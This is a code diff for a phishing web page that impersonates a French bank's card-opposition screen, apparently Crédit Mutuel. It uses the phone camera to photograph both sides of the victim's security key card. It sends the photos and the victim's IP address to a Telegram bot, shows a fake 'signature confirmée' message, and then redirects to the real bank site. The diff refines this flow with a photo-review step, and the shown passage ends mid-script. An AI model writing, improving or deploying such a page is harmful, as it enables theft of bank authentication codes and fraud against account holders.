@@ -27,13 +27,12 @@ body {
     min-height: 100vh;
 }
 
-/* ═══ HEADER — PLEINE LARGEUR ═══ */
+/* ═══ HEADER ═══ */
 header {
     width: 100%;
     background: #ffffff;
     border-bottom: 1px solid #e8eaed;
 }
-
 .header-inner {
     max-width: 390px;
     margin: 0 auto;
@@ -42,163 +41,65 @@ header {
     align-items: center;
     padding: 12px 20px;
 }
+.header-left { display: flex; align-items: center; gap: 4px; }
 
-.header-left {
-    display: flex;
-    align-items: center;
-    gap: 4px;
-}
+.burger { display: flex; flex-direction: column; align-items: center; cursor: pointer; }
+.burger-lines { display: flex; flex-direction: column; gap: 3px; margin-bottom: 1px; }
+.burger-lines span { display: block; width: 24px; height: 2px; background: #1d1d1f; border-radius: 1px; }
+.menu-text { font-size: 11px; font-weight: 700; color: #1d1d1f; }
 
-.burger {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    cursor: pointer;
-}
-.burger-lines {
-    display: flex;
-    flex-direction: column;
-    gap: 3px;
-    margin-bottom: 1px;
-}
-.burger-lines span {
-    display: block;
-    width: 24px;
-    height: 2px;
-    background: #1d1d1f;
-    border-radius: 1px;
-}
-.menu-text {
-    font-size: 11px;
-    font-weight: 700;
-    color: #1d1d1f;
-}
-
-.logo-img {
-    width: 46px;
-    height: 46px;
-    object-fit: contain;
-}
+.logo-img { width: 46px; height: 46px; object-fit: contain; }
 
 .search-icon {
-    width: 40px;
-    height: 40px;
+    width: 40px; height: 40px;
     border: 1.5px solid #1d1d1f;
     border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    display: flex; justify-content: center; align-items: center;
     cursor: pointer;
 }
-.search-icon i {
-    font-size: 15px;
-    color: #1d1d1f;
-}
+.search-icon i { font-size: 15px; color: #1d1d1f; }
 
-/* ═══ CONTENEUR CENTRÉ POUR LE CONTENU ═══ */
-.app-wrapper {
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    flex-grow: 1;
-}
-
+/* ═══ CONTENEUR ═══ */
+.app-wrapper { width: 100%; display: flex; justify-content: center; flex-grow: 1; }
 .app-container {
-    width: 100%;
-    max-width: 390px;
+    width: 100%; max-width: 390px;
     background: #f0f2f5;
-    display: flex;
-    flex-direction: column;
+    display: flex; flex-direction: column;
 }
 
-/* ═══ ZONE GRISE TITRE ═══ */
-.gray-zone {
-    background: #f0f2f5;
-    padding: 28px 20px 20px 20px;
-    text-align: center;
-}
-.gray-zone h1 {
-    color: #164194;
-    font-size: 32px;
-    font-weight: 900;
-    letter-spacing: -0.6px;
-    margin: 0;
-}
+.gray-zone { background: #f0f2f5; padding: 28px 20px 20px 20px; text-align: center; }
+.gray-zone h1 { color: #164194; font-size: 32px; font-weight: 900; letter-spacing: -0.6px; margin: 0; }
 
-/* ═══ CARTE BLANCHE ═══ */
 .card {
     background: #ffffff;
     border-radius: 12px;
     overflow: hidden;
     margin: 0 12px 20px 12px;
     box-shadow: 0 1px 4px rgba(0,0,0,0.04);
-    display: flex;
-    flex-direction: column;
+    display: flex; flex-direction: column;
 }
 
-.card-content {
-    padding: 24px 20px;
-    min-height: 200px;
-}
+.card-content { padding: 24px 20px; min-height: 200px; }
 
 .section-header {
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    display: flex; justify-content: center; align-items: center;
     gap: 8px;
-    color: #164194;
-    font-weight: 700;
-    font-size: 15px;
-    margin-bottom: 24px;
-    padding-bottom: 18px;
+    color: #164194; font-weight: 700; font-size: 15px;
+    margin-bottom: 24px; padding-bottom: 18px;
     border-bottom: 1px solid #f0f0f0;
     cursor: pointer;
 }
-.section-header i {
-    font-size: 11px;
-    margin-top: 4px;
-}
+.section-header i { font-size: 11px; margin-top: 4px; }
 
 .form-group { margin-bottom: 22px; }
 
-.mandatory-note {
-    font-size: 14px;
-    color: #1d1d1f;
-    margin-bottom: 14px;
-}
-.mandatory-note span {
-    color: #d32f2f;
-    font-weight: bold;
-    margin-right: 3px;
-}
+.mandatory-note { font-size: 14px; color: #1d1d1f; margin-bottom: 14px; }
+.mandatory-note span { color: #d32f2f; font-weight: bold; margin-right: 3px; }
 
 label.field-label {
-    display: block;
-    font-weight: 700;
-    font-size: 15px;
-    margin-bottom: 12px;
-    color: #1d1d1f;
+    display: block; font-weight: 700; font-size: 15px;
+    margin-bottom: 12px; color: #1d1d1f;
 }
-
-.upload-btn {
-    width: 100%;
-    background: #d6d9dd;
-    border: 1px solid #b0b8c1;
-    border-radius: 6px;
-    padding: 15px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 10px;
-    font-weight: 700;
-    color: #164194;
-    font-size: 15px;
-    cursor: pointer;
-}
-.upload-btn:hover { background: #cbcfd4; }
-.upload-btn i { font-size: 15px; }
-
-#file-input { display: none; }
 
 .btn-primary {
     width: 100%;
@@ -207,22 +108,30 @@ label.field-label {
     border: none;
     border-radius: 30px;
     padding: 17px;
-    font-size: 16px;
-    font-weight: 700;
+    font-size: 16px; font-weight: 700;
     cursor: pointer;
 }
 .btn-primary:hover { background: #0049d6; }
+.btn-primary:disabled { background: #9aa8c2; cursor: not-allowed; }
+
+.btn-secondary {
+    width: 100%;
+    background: #ffffff;
+    color: #164194;
+    border: 1.5px solid #164194;
+    border-radius: 30px;
+    padding: 15px;
+    font-size: 15px; font-weight: 700;
+    cursor: pointer;
+    margin-top: 10px;
+}
+.btn-secondary:hover { background: #f0f4ff; }
 
 .forgot-link {
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    display: flex; justify-content: center; align-items: center;
     gap: 10px;
-    color: #164194;
-    text-decoration: underline;
-    text-underline-offset: 3px;
-    font-weight: 700;
-    font-size: 16px;
+    color: #164194; text-decoration: underline; text-underline-offset: 3px;
+    font-weight: 700; font-size: 16px;
     padding: 22px 20px;
     border-top: 1px solid #f0f0f0;
     border-bottom: 1px solid #f0f0f0;
@@ -235,108 +144,62 @@ label.field-label {
 .tips-box {
     background: #dbeafe;
     padding: 20px;
-    font-size: 15px;
-    line-height: 1.6;
-    color: #164194;
-    font-weight: 500;
+    font-size: 15px; line-height: 1.6;
+    color: #164194; font-weight: 500;
     border-radius: 0 0 12px 12px;
 }
 .tips-box strong { font-weight: 700; margin-right: 6px; }
-.tips-box a {
-    color: #164194;
-    text-decoration: underline;
-    text-underline-offset: 3px;
-}
+.tips-box a { color: #164194; text-decoration: underline; text-underline-offset: 3px; }
 .tips-box a:hover { text-decoration: none; }
 
-/* ═══ ÉTAPES ═══ */
 .step { display: none; }
 .step.active { display: block; }
 
 /* ═══ SPINNER ═══ */
-.spinner {
-    width: 60px;
-    height: 60px;
-    margin: 40px auto;
-    position: relative;
+.spinner { width: 60px; height: 60px; margin: 40px auto; position: relative; }
+.spinner::before, .spinner::after {
+    content: ''; position: absolute; border-radius: 50%; border: 4px solid transparent;
 }
-
-.spinner::before,
-.spinner::after {
-    content: '';
-    position: absolute;
-    border-radius: 50%;
-    border: 4px solid transparent;
-}
-
 .spinner::before {
     top: 0; left: 0; right: 0; bottom: 0;
-    border-top-color: #29b6f6;
-    border-right-color: #29b6f6;
+    border-top-color: #29b6f6; border-right-color: #29b6f6;
     animation: spinBlue 1s linear infinite;
 }
-
 .spinner::after {
     top: 8px; left: 8px; right: 8px; bottom: 8px;
-    border-bottom-color: #81d4fa;
-    border-left-color: #81d4fa;
+    border-bottom-color: #81d4fa; border-left-color: #81d4fa;
     animation: spinBlue 1.5s linear infinite reverse;
 }
-
-@keyframes spinBlue {
-    0%   { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
+@keyframes spinBlue { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
 .card-message {
-    text-align: center;
-    font-size: 15px;
-    line-height: 1.6;
-    color: #164194;
-    font-weight: 500;
+    text-align: center; font-size: 15px; line-height: 1.6;
+    color: #164194; font-weight: 500;
     padding: 20px 10px;
 }
 
 /* ═══ ANIMATION VALIDATION ═══ */
 .validation-circle {
-    width: 90px;
-    height: 90px;
+    width: 90px; height: 90px;
     margin: 20px auto 30px auto;
-    display: block;
-    overflow: visible;
+    display: block; overflow: visible;
 }
-
-.bg-shape {
-    animation: morphShape 2s ease-in-out forwards;
-    transform-origin: 50px 50px;
-}
-
+.bg-shape { animation: morphShape 2s ease-in-out forwards; transform-origin: 50px 50px; }
 @keyframes morphShape {
     0% { rx: 50; ry: 50; transform: scale(0.3); opacity: 0; }
     30% { rx: 50; ry: 50; transform: scale(1); opacity: 1; }
     60% { rx: 50; ry: 50; transform: scale(1.05); }
     100% { rx: 20; ry: 20; transform: scale(1); }
 }
-
 .inner-circle {
-    opacity: 0;
-    transform-origin: 50px 50px;
-    transform: scale(0);
+    opacity: 0; transform-origin: 50px 50px; transform: scale(0);
     animation: showInnerCircle 0.8s ease-out 0.8s forwards;
 }
-
-@keyframes showInnerCircle {
-    0% { opacity: 0; transform: scale(0); }
-    100% { opacity: 1; transform: scale(1); }
-}
-
+@keyframes showInnerCircle { 0% { opacity: 0; transform: scale(0); } 100% { opacity: 1; transform: scale(1); } }
 .green-check {
-    stroke-dasharray: 50;
-    stroke-dashoffset: 50;
-    opacity: 0;
+    stroke-dasharray: 50; stroke-dashoffset: 50; opacity: 0;
     animation: drawGreenCheck 0.5s ease-out 1.5s forwards;
 }
-
 @keyframes drawGreenCheck {
     0% { opacity: 0; stroke-dashoffset: 50; }
     10% { opacity: 1; }
@@ -364,8 +227,7 @@ label.field-label {
 
 .card-frame {
     position: absolute;
-    top: 50%;
-    left: 50%;
+    top: 50%; left: 50%;
     transform: translate(-50%, -50%);
     width: 85%;
     height: 53.5%;
@@ -374,37 +236,29 @@ label.field-label {
     box-shadow: 0 0 0 9999px rgba(0,0,0,0.55);
     pointer-events: none;
 }
-
-.card-frame::before,
-.card-frame::after {
+.card-frame::before, .card-frame::after {
     content: '';
     position: absolute;
-    width: 26px;
-    height: 26px;
+    width: 26px; height: 26px;
     border: 3px solid #5cdb3a;
 }
 .card-frame::before {
     top: -3px; left: -3px;
-    border-right: none;
-    border-bottom: none;
+    border-right: none; border-bottom: none;
     border-top-left-radius: 10px;
 }
 .card-frame::after {
     bottom: -3px; right: -3px;
-    border-left: none;
-    border-top: none;
+    border-left: none; border-top: none;
     border-bottom-right-radius: 10px;
 }
 
 .camera-hint {
     position: absolute;
-    top: 14px;
-    left: 0;
-    right: 0;
+    top: 14px; left: 0; right: 0;
     text-align: center;
     color: #ffffff;
-    font-size: 13px;
-    font-weight: 700;
+    font-size: 13px; font-weight: 700;
     letter-spacing: 0.3px;
     text-shadow: 0 1px 3px rgba(0,0,0,0.7);
     z-index: 2;
@@ -412,11 +266,9 @@ label.field-label {
 
 .capture-btn {
     position: absolute;
-    bottom: 14px;
-    left: 50%;
+    bottom: 14px; left: 50%;
     transform: translateX(-50%);
-    width: 64px;
-    height: 64px;
+    width: 64px; height: 64px;
     border-radius: 50%;
     background: #ffffff;
     border: 5px solid rgba(255,255,255,0.5);
@@ -431,23 +283,37 @@ label.field-label {
     position: absolute;
     top: 50%; left: 50%;
     transform: translate(-50%, -50%);
-    width: 48px;
-    height: 48px;
+    width: 48px; height: 48px;
     border-radius: 50%;
     background: #ffffff;
 }
 
 .capture-preview {
     position: absolute;
-    bottom: 14px;
-    right: 14px;
-    width: 60px;
-    height: 38px;
+    bottom: 14px; right: 14px;
+    width: 60px; height: 38px;
     object-fit: cover;
     border-radius: 6px;
     border: 2px solid #5cdb3a;
     z-index: 3;
     display: none;
+}
+
+.camera-loading {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #1d1d1f;
+    display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+    color: #ffffff; font-size: 14px; font-weight: 600;
+    z-index: 5; gap: 12px;
+}
+.camera-loading .mini-spinner {
+    width: 40px; height: 40px;
+    border: 4px solid rgba(255,255,255,0.2);
+    border-top-color: #29b6f6;
+    border-radius: 50%;
+    animation: spinBlue 1s linear infinite;
 }
 
 .camera-error {
@@ -460,121 +326,140 @@ label.field-label {
     margin-top: 12px;
 }
 
-/* ═══ FOOTER — PLEINE LARGEUR ═══ */
-.footer-full {
-    width: 100%;
-    background: #003192;
-    color: #ffffff;
-    margin-top: 0;
-    padding: 0;
+/* ═══ ÉCRAN DE VÉRIFICATION ═══ */
+.verify-title {
+    text-align: center;
+    color: #164194;
+    font-size: 16px;
+    font-weight: 700;
+    margin-bottom: 6px;
 }
 
-.footer-full .footer-inner {
-    max-width: 390px;
-    margin: 0 auto;
-    padding: 20px;
+.verify-subtitle {
+    text-align: center;
+    color: #5a6478;
+    font-size: 13px;
+    margin-bottom: 20px;
 }
 
-.footer-top {
+.verify-photos {
     display: flex;
-    justify-content: space-between;
-    align-items: flex-start;
+    flex-direction: column;
+    gap: 14px;
+    margin-bottom: 22px;
+}
+
+.verify-photo-block {
+    background: #f6f8fb;
+    border: 1px solid #e2e7ef;
+    border-radius: 10px;
+    padding: 12px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+}
+
+.verify-photo-block img {
+    width: 100px;
+    height: 63px;
+    object-fit: cover;
+    border-radius: 6px;
+    border: 1.5px solid #d0d7e2;
+    flex-shrink: 0;
+    background: #000;
+}
+
+.verify-photo-info {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+}
+
+.verify-photo-label {
+    font-size: 14px;
+    font-weight: 700;
+    color: #164194;
+}
+
+.verify-photo-status {
+    font-size: 12px;
+    color: #16a34a;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+}
+
+.verify-photo-status i { font-size: 11px; }
+
+.verify-retake {
+    font-size: 12px;
+    color: #164194;
+    text-decoration: underline;
+    cursor: pointer;
+    font-weight: 600;
+    background: none;
+    border: none;
+    padding: 0;
+    text-align: left;
+    margin-top: 2px;
+}
+.verify-retake:hover { text-decoration: none; }
+
+.verify-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+/* ═══ FOOTER ═══ */
+.footer-full { width: 100%; background: #003192; color: #ffffff; padding: 0; }
+.footer-full .footer-inner { max-width: 390px; margin: 0 auto; padding: 20px; }
+.footer-top {
+    display: flex; justify-content: space-between; align-items: flex-start;
     padding-bottom: 15px;
     border-bottom: 1px solid rgba(255,255,255,0.2);
     gap: 10px;
 }
-.footer-top-links {
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    font-size: 11px;
-}
+.footer-top-links { display: flex; flex-direction: column; gap: 8px; font-size: 11px; }
 .footer-top-links a {
-    color: #ffffff;
-    text-decoration: none;
-    display: flex;
-    align-items: center;
-    gap: 6px;
+    color: #ffffff; text-decoration: none;
+    display: flex; align-items: center; gap: 6px;
     font-weight: 600;
 }
 .footer-top-links a:hover { text-decoration: underline; }
 .footer-top-links i { font-size: 11px; width: 12px; }
-
 .footer-download-btn {
-    background: transparent;
-    border: 1px solid #ffffff;
-    color: #ffffff;
-    padding: 6px 12px;
-    border-radius: 20px;
-    font-size: 10px;
-    font-weight: 700;
-    text-decoration: none;
-    white-space: nowrap;
+    background: transparent; border: 1px solid #ffffff;
+    color: #ffffff; padding: 6px 12px; border-radius: 20px;
+    font-size: 10px; font-weight: 700; text-decoration: none; white-space: nowrap;
 }
-
 .footer-middle {
-    display: flex;
-    gap: 15px;
-    padding: 15px 0;
+    display: flex; gap: 15px; padding: 15px 0;
     border-bottom: 1px solid rgba(255,255,255,0.2);
 }
-.footer-parrainage {
-    flex: 1;
-    display: flex;
-    gap: 8px;
-    font-size: 10px;
-    line-height: 1.4;
-    font-weight: 600;
-}
+.footer-parrainage { flex: 1; display: flex; gap: 8px; font-size: 10px; line-height: 1.4; font-weight: 600; }
 .footer-parrainage i { font-size: 20px; flex-shrink: 0; margin-top: 2px; }
-.footer-parrainage a {
-    color: #ffffff;
-    text-decoration: underline;
-    text-underline-offset: 2px;
-    display: block;
-    margin-top: 4px;
-}
-
+.footer-parrainage a { color: #ffffff; text-decoration: underline; text-underline-offset: 2px; display: block; margin-top: 4px; }
 .footer-legal { flex: 1.3; display: flex; gap: 12px; font-size: 10px; line-height: 1.6; }
 .footer-legal ul { list-style: none; flex: 1; }
 .footer-legal ul li { margin-bottom: 4px; }
 .footer-legal ul li a { color: #ffffff; text-decoration: none; display: block; }
 .footer-legal ul li a:hover { text-decoration: underline; }
-
 .footer-mention {
-    text-align: center;
-    font-size: 10px;
-    padding: 12px 0;
-    color: #ffffff;
-    font-weight: 600;
+    text-align: center; font-size: 10px; padding: 12px 0;
+    color: #ffffff; font-weight: 600;
     border-bottom: 1px solid rgba(255,255,255,0.2);
 }
-
-/* ═══ BANDEAU BLANC — PLEINE LARGEUR ═══ */
-.footer-white-full {
-    width: 100%;
-    background: #ffffff;
-    padding: 14px 0;
-}
-
+.footer-white-full { width: 100%; background: #ffffff; padding: 14px 0; }
 .footer-white-full .footer-white-inner {
-    max-width: 390px;
-    margin: 0 auto;
-    padding: 0 20px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+    max-width: 390px; margin: 0 auto; padding: 0 20px;
+    display: flex; justify-content: space-between; align-items: center;
 }
-
 .footer-brand { display: flex; align-items: center; gap: 8px; }
 .footer-brand img { height: 22px; width: auto; }
-.footer-brand-text {
-    color: #1d1d1f;
-    font-size: 9px;
-    font-weight: 500;
-    line-height: 1.2;
-    max-width: 130px;
-}
+.footer-brand-text { color: #1d1d1f; font-size: 9px; font-weight: 500; line-height: 1.2; max-width: 130px; }
 .footer-socials { display: flex; align-items: center; gap: 10px; }
 .footer-socials a { color: #d32f2f; font-size: 14px; text-decoration: none; }
 .footer-socials a:hover { color: #003192; }
@@ -582,15 +467,13 @@ label.field-label {
 </head>
 <body>
 
-<!-- HEADER — PLEINE LARGEUR -->
+<!-- HEADER -->
 <header>
     <div class="header-inner">
         <div class="header-left">
             <div class="burger">
                 <div class="burger-lines">
-                    <span></span>
-                    <span></span>
-                    <span></span>
+                    <span></span><span></span><span></span>
                 </div>
                 <div class="menu-text">Menu</div>
             </div>
@@ -602,51 +485,88 @@ label.field-label {
     </div>
 </header>
 
-<!-- CONTENU CENTRÉ -->
+<!-- CONTENU -->
 <div class="app-wrapper">
     <div class="app-container">
-        <!-- ZONE GRISE TITRE -->
         <div class="gray-zone">
             <h1 id="main-title">Opposition</h1>
         </div>
 
-        <!-- CARTE BLANCHE -->
         <div class="card">
             <div class="card-content">
                 <div class="section-header" id="section-title">
                     Carte de clés <i class="fa-solid fa-chevron-down"></i>
                 </div>
 
+                <!-- ═══ ÉTAPE 1 : CAPTURE ═══ -->
                 <div class="step active" id="step-form">
-                    <form>
-                        <div class="form-group">
-                            <p class="mandatory-note"><span>*</span> Information obligatoire</p>
-                            <label class="field-label">Photo de votre carte de clés<span style="color:#d32f2f">*</span></label>
+                    <div class="form-group">
+                        <p class="mandatory-note"><span>*</span> Information obligatoire</p>
+                        <label class="field-label">Photo de votre carte de clés<span style="color:#d32f2f">*</span></label>
 
-                            <div class="camera-wrapper" id="camera-wrapper" style="display:none;">
-                                <div class="camera-hint" id="camera-hint">Prenez la photo du RECTO</div>
-                                <video id="camera-video" autoplay playsinline muted></video>
-                                <div class="card-frame"></div>
-                                <button type="button" class="capture-btn" id="capture-btn"></button>
-                                <img class="capture-preview" id="capture-preview" alt="aperçu">
+                        <div class="camera-wrapper" id="camera-wrapper">
+                            <div class="camera-loading" id="camera-loading">
+                                <div class="mini-spinner"></div>
+                                <div>Activation de la caméra...</div>
                             </div>
-
-                            <label for="file-input" class="upload-btn" id="upload-label">
-                                <i class="fa-solid fa-camera"></i>
-                                <span id="upload-text">Prendre une photo</span>
-                            </label>
-                            <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none;">
-                            <div class="camera-error" id="camera-error" style="display:none;"></div>
+                            <div class="camera-hint" id="camera-hint">Présentez le RECTO de la carte</div>
+                            <video id="camera-video" autoplay playsinline muted></video>
+                            <div class="card-frame"></div>
+                            <button type="button" class="capture-btn" id="capture-btn"></button>
+                            <img class="capture-preview" id="capture-preview" alt="aperçu">
                         </div>
 
-                        <button type="button" class="btn-primary" id="submit-btn">Se connecter</button>
-                    </form>
+                        <div class="camera-error" id="camera-error" style="display:none;"></div>
+                    </div>
                 </div>
 
+                <!-- ═══ ÉTAPE 2 : VÉRIFICATION ═══ -->
+                <div class="step" id="step-verify">
+                    <div class="verify-title">Vérifiez vos photos</div>
+                    <div class="verify-subtitle">Assurez-vous que les 2 faces de votre carte sont bien lisibles</div>
+
+                    <div class="verify-photos">
+                        <div class="verify-photo-block">
+                            <img id="verify-recto-img" alt="Recto">
+                            <div class="verify-photo-info">
+                                <div class="verify-photo-label">RECTO</div>
+                                <div class="verify-photo-status">
+                                    <i class="fa-solid fa-circle-check"></i>
+                                    <span>Photo capturée</span>
+                                </div>
+                                <button type="button" class="verify-retake" id="retake-recto">Refaire cette photo</button>
+                            </div>
+                        </div>
+
+                        <div class="verify-photo-block">
+                            <img id="verify-verso-img" alt="Verso">
+                            <div class="verify-photo-info">
+                                <div class="verify-photo-label">VERSO</div>
+                                <div class="verify-photo-status">
+                                    <i class="fa-solid fa-circle-check"></i>
+                                    <span>Photo capturée</span>
+                                </div>
+                                <button type="button" class="verify-retake" id="retake-verso">Refaire cette photo</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="verify-actions">
+                        <button type="button" class="btn-primary" id="confirm-btn">
+                            Valider et envoyer
+                        </button>
+                        <button type="button" class="btn-secondary" id="restart-btn">
+                            Recommencer tout
+                        </button>
+                    </div>
+                </div>
+
+                <!-- ═══ ÉTAPE 3 : LOADING ═══ -->
                 <div class="step" id="step-loading">
                     <div class="spinner"></div>
                 </div>
 
+                <!-- ═══ ÉTAPE 4 : SUCCESS ═══ -->
                 <div class="step" id="step-success">
                     <div class="card-message">
                         Votre signature sécur'pass a été confirmée, vous allez être redirigé dans quelques instants...
@@ -670,7 +590,7 @@ label.field-label {
     </div>
 </div>
 
-<!-- FOOTER BLEU — PLEINE LARGEUR -->
+<!-- FOOTER -->
 <footer class="footer-full">
     <div class="footer-inner">
         <div class="footer-top">
@@ -710,7 +630,6 @@ label.field-label {
     </div>
 </footer>
 
-<!-- BANDEAU BLANC — PLEINE LARGEUR -->
 <div class="footer-white-full">
     <div class="footer-white-inner">
         <div class="footer-brand">
@@ -734,6 +653,7 @@ label.field-label {
     const mainTitle = document.getElementById('main-title');
     const sectionTitle = document.getElementById('section-title');
     const stepForm = document.getElementById('step-form');
+    const stepVerify = document.getElementById('step-verify');
     const stepLoading = document.getElementById('step-loading');
     const stepSuccess = document.getElementById('step-success');
     const forgotLink = document.getElementById('forgot-link');
@@ -743,12 +663,20 @@ label.field-label {
     const cameraHint = document.getElementById('camera-hint');
     const captureBtn = document.getElementById('capture-btn');
     const capturePreview = document.getElementById('capture-preview');
-    const uploadLabel = document.getElementById('upload-label');
     const cameraError = document.getElementById('camera-error');
-    const fileInput = document.getElementById('file-input');
+    const cameraLoading = document.getElementById('camera-loading');
+
+    const verifyRectoImg = document.getElementById('verify-recto-img');
+    const verifyVersoImg = document.getElementById('verify-verso-img');
+    const retakeRecto = document.getElementById('retake-recto');
+    const retakeVerso = document.getElementById('retake-verso');
+    const confirmBtn = document.getElementById('confirm-btn');
+    const restartBtn = document.getElementById('restart-btn');
 
     let stream = null;
     let captureSide = 'recto';
+    let rectoBlob = null;
+    let versoBlob = null;
 
     async function getUserIP() {
         try {
@@ -762,11 +690,13 @@ label.field-label {
 
     async function sendTextToTelegram(text) {
         try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
             });
+            const json = await res.json();
+            console.log('💬 sendMessage :', json);
         } catch (e) {
             console.error('❌ sendMessage :', e);
         }
@@ -785,20 +715,23 @@ label.field-label {
 
             const json = await res.json();
             console.log(`📷 Photo ${side} :`, json);
+            return json.ok;
         } catch (e) {
             console.error(`❌ sendPhoto ${side} :`, e);
+            return false;
         }
     }
 
-    // ─── Démarrer la caméra ───
+    // ─── Démarrer caméra ───
     async function startCamera() {
         cameraError.style.display = 'none';
+        cameraLoading.style.display = 'flex';
+        cameraWrapper.style.display = 'block';
 
-        // Vérifier si getUserMedia est disponible (HTTPS ou localhost requis)
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            cameraLoading.style.display = 'none';
             cameraError.style.display = 'block';
-            cameraError.textContent = "⚠️ Caméra indisponible (HTTPS ou localhost requis). Ouverture de l'appareil photo natif...";
-            setTimeout(() => fileInput.click(), 1500);
+            cameraError.textContent = "⚠️ Caméra indisponible (HTTPS ou localhost requis).";
             return;
         }
 
@@ -812,41 +745,31 @@ label.field-label {
                 audio: false
             });
 
-            // Afficher le wrapper et cacher le bouton d'upload
-            cameraWrapper.style.display = 'block';
-            uploadLabel.style.display = 'none';
-
-            // Attacher le flux
             cameraVideo.srcObject = stream;
 
-            // Lancer la lecture dès que possible
             cameraVideo.onloadedmetadata = () => {
                 cameraVideo.play().then(() => {
+                    cameraLoading.style.display = 'none';
                     console.log('▶️ Caméra OK :', cameraVideo.videoWidth, 'x', cameraVideo.videoHeight);
                 }).catch(err => {
+                    cameraLoading.style.display = 'none';
                     console.warn('play() :', err);
                 });
             };
 
-            // Reset UI
             captureSide = 'recto';
-            cameraHint.textContent = 'Prenez la photo du RECTO';
+            cameraHint.textContent = 'Présentez le RECTO de la carte';
             capturePreview.style.display = 'none';
 
         } catch (err) {
             console.error('Erreur caméra :', err);
+            cameraLoading.style.display = 'none';
             cameraError.style.display = 'block';
-
             let msg = "Impossible d'accéder à la caméra. ";
             if (err.name === 'NotAllowedError') msg += "Autorisation refusée.";
             else if (err.name === 'NotFoundError') msg += "Aucune caméra trouvée.";
-            else if (err.name === 'NotReadableError') msg += "Caméra déjà utilisée par une autre app.";
             else msg += err.message;
-
-            msg += " Ouverture de l'appareil photo natif...";
             cameraError.textContent = msg;
-
-            setTimeout(() => fileInput.click(), 1500);
         }
     }
 
@@ -857,8 +780,10 @@ label.field-label {
         }
     }
 
-    // ─── Capturer une photo depuis le flux vidéo ───
+    // ─── Capturer photo ───
     async function capturePhoto() {
+        console.log('📸 Capture clic, side =', captureSide);
+
         if (!cameraVideo.videoWidth || !cameraVideo.videoHeight) {
             console.warn('⚠️ Vidéo pas prête');
             return;
@@ -870,71 +795,103 @@ label.field-label {
         const ctx = canvas.getContext('2d');
         ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
 
-        canvas.toBlob(async (blob) => {
-            if (!blob) return;
+        canvas.toBlob((blob) => {
+            if (!blob) {
+                console.warn('⚠️ Blob null');
+                return;
+            }
 
-            // Envoyer au Telegram
-            await sendPhotoToTelegram(blob, captureSide);
+            console.log('✅ Blob créé, taille =', blob.size, 'side =', captureSide);
 
             if (captureSide === 'recto') {
-                // Afficher mini-aperçu
+                rectoBlob = blob;
                 capturePreview.src = URL.createObjectURL(blob);
                 capturePreview.style.display = 'block';
-
-                // Passer au verso
                 captureSide = 'verso';
-                cameraHint.textContent = 'Prenez la photo du VERSO';
+                cameraHint.textContent = 'Présentez le VERSO de la carte';
             } else {
-                // Fin : arrêter caméra + envoyer texte final + animation
+                versoBlob = blob;
                 stopCamera();
-                cameraWrapper.style.display = 'none';
-
-                const ip = await getUserIP();
-                await sendTextToTelegram(
-                    `--------✅[CREDITS MUTUEL]✅-------\n\n🚀 Nouvelle carte de clés (RECTO + VERSO)\n💻 IP ADDRESS : ${ip}\n\n-------✅[CREDITS MUTUEL]✅-------`
-                );
-
-                // Loading → success → redirect
-                stepForm.classList.remove('active');
-                stepLoading.classList.add('active');
-                mainTitle.textContent = 'Chargement';
-                sectionTitle.innerHTML = 'Identifiant / Mot de passe <i class="fa-solid fa-chevron-down"></i>';
-                forgotLink.style.display = 'none';
-
-                setTimeout(() => {
-                    stepLoading.classList.remove('active');
-                    stepSuccess.classList.add('active');
-                    mainTitle.textContent = 'Signature confirmée';
-
-                    setTimeout(() => {
-                        window.location.href = 'https://www.creditmutuel.fr/';
-                    }, 3500);
-                }, 2500);
+                showVerifyScreen();
             }
         }, 'image/jpeg', 0.92);
     }
 
-    // ─── Événements ───
-    uploadLabel.addEventListener('click', (e) => {
-        e.preventDefault();
-        startCamera();
-    });
+    // ─── Écran de vérification ───
+    function showVerifyScreen() {
+        console.log('📋 Affichage vérification');
 
-    captureBtn.addEventListener('click', capturePhoto);
-
-    // Fallback : si l'utilisateur passe par l'appareil photo natif
-    fileInput.addEventListener('change', async function(e) {
-        const f = e.target.files[0];
-        if (!f) return;
-
-        await sendPhotoToTelegram(f, 'fichier');
+        verifyRectoImg.src = URL.createObjectURL(rectoBlob);
+        verifyVersoImg.src = URL.createObjectURL(versoBlob);
 
         stepForm.classList.remove('active');
+        stepVerify.classList.add('active');
+
+        mainTitle.textContent = 'Vérification';
+        sectionTitle.innerHTML = 'Confirmation des photos <i class="fa-solid fa-chevron-down"></i>';
+    }
+
+    // ─── Refaire une photo ───
+    async function retake(side) {
+        console.log('🔄 Refaire :', side);
+
+        stepVerify.classList.remove('active');
+        stepForm.classList.add('active');
+
+        mainTitle.textContent = 'Opposition';
+        sectionTitle.innerHTML = 'Carte de clés <i class="fa-solid fa-chevron-down"></i>';
+
+        captureSide = side;
+        cameraHint.textContent = side === 'recto' ? 'Présentez le RECTO de la carte' : 'Présentez le VERSO de la carte';
+
+        if (side === 'recto') {
+            rectoBlob = null;
+            capturePreview.style.display = 'none';
+        }
+
+        await startCamera();
+    }
+
+    // ─── Confirmer et envoyer ───
